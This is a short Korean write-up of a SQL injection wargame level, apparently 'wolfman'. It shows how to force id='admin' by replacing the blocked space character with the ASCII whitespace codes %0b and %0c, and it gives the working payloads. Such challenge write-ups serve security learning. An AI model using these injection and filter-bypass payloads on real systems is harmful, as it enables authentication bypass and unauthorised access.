## Q5. wolfman _ 공백 우회 기법 (ASCII)
<img src="/photo/prob_05.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: 공백문자 <br> 문제 사항: 쿼리에 id=admin을 만들어내라.
### 해결책

```
현재 쿼리문에서 id='guest'로 고정되어 있음
=> pw에 id컬럼 만들어 admin 적용
=> || 이용
```
```diff
# 현재 쿼리문: where id='guest' and pw=''||id='admin'--+'
```
```
but. +는 공백문자로 제한됨
=> 아스키코드의 공백문자인 0b, 0c 이용
```
```
해결 쿼리문: where id='guest' and pw=''||id='admin'--
```
### CERT <br> ?pw=''||id='admin'--%0b'

### 느낀점
```diff
+ 아스키코드를 이용한 공백 우회 기법에 대해 배웠다.
+ %0b / %0c / %0d 등
```

### 다른 풀이
1. ?pw=''||id='admin
   - 뒤에 '로 끝남
   - => 굳이 주석 안 붙여도 됨
